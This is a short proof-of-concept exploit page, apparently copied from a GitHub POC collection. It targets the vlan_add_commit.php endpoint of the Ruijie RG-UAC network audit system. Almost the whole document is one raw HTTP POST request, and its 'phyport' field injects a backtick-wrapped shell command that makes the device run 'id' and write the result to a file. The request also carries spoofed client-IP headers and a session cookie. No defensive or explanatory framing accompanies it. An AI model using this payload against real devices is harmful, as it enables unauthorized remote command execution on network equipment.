# RG-UAC_vlan_add_commit.php_RCE

from: https://github.com/wy876/POC/blob/main/%E9%94%90%E6%8D%B7RG-UAC%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fvlan_add_commit.php%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.md

```
POST /view/networkConfig/vlan/vlan_add_commit.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) 
Gecko/20100101 Firefox/124.0
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,imag
e/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en�US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-GPC: 1
Connection: close
Cookie: PHPSESSID=ebd507c9bc5a4293c3e5e596f37157bf
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 0000:0000:0000::0000
X-Originating-IP: 0000:0000:0000::0000
X-Remote-IP: 0000:0000:0000::0000
X-Remote-Addr: 0000:0000:0000::0000
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

phyport=`id+>2.txt`&vlanid=1
```
